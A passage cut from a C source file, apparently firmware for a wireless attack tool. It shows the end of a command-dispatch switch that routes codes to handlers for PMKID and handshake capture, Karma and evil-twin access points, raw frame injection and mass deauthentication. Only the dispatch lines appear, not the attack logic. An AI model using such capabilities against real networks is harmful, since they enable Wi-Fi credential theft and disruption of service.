    case M1_MSG_OFF_BEACON_STOP:    return cmd_beacon_stop(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_PROBE_SNIFF:    return cmd_probe_sniff_start(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_PROBE_STOP:     return cmd_probe_sniff_stop(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_PMKID_CAPTURE:  return cmd_pmkid_capture(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_KARMA_START:    return cmd_karma_start(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_KARMA_STOP:     return cmd_karma_stop(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_HSCAPTURE:      return cmd_hscap_start(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_RAW_TX:        return cmd_raw_tx(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_DEAUTH_ALL:    return cmd_deauth_all(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_EVILTWIN_START: *resp_len = 0; return m1_eviltwin_start(payload, payload_len);
    case M1_MSG_OFF_EVILTWIN_STOP:  *resp_len = 0; return m1_eviltwin_stop();
    default:                        return M1_ERR_UNSUPPORTED;
    }
}